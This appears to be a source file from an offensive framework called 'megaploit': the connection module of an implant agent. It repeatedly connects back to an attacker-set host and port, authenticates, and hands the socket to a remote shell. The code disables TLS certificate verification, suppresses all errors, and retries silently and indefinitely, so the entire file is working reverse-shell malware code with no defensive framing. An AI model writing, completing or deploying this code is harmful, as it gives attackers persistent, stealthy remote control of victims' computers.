"""
megaploit.agent.connection
~~~~~~~~~~~~~~~~~~~~~~~~~~
Persistent connect-back loop.
Tries to reach LHOST:PORT, authenticates with HMAC-SHA256, then hands
off to run_shell(). If the connection drops, waits RECONNECT_DELAY seconds
and retries — silently and indefinitely.
"""

from __future__ import annotations

import socket
import ssl
import time

from megaploit.core.config import AUTH_TIMEOUT, RECONNECT_DELAY
from megaploit.core.crypto import agent_authenticate, load_key
from megaploit.agent.shell import run_shell

# ---------------------------------------------------------------------------
# Configuration — patched by server before deployment
# ---------------------------------------------------------------------------

LHOST = "127.0.0.1"; PORT = 4444  # patched by server


# ---------------------------------------------------------------------------
# Connect-back loop
# ---------------------------------------------------------------------------

def start(secret_key_path: str = "secret.key") -> None:
    secret_key = load_key(secret_key_path)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    while True:
        conn: socket.socket | None = None
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn = ctx.wrap_socket(raw, server_hostname=LHOST)
            conn.settimeout(AUTH_TIMEOUT)
            conn.connect((LHOST, PORT))

            if not agent_authenticate(conn, secret_key, timeout=AUTH_TIMEOUT):
                conn.close()
                time.sleep(RECONNECT_DELAY)
                continue

            conn.settimeout(None)
            run_shell(conn)

        except (ConnectionRefusedError, OSError, ssl.SSLError):
            pass
        except Exception:
            pass
        finally:
            if conn:
                try:
                    conn.close()
                except OSError:
                    pass

        time.sleep(RECONNECT_DELAY)
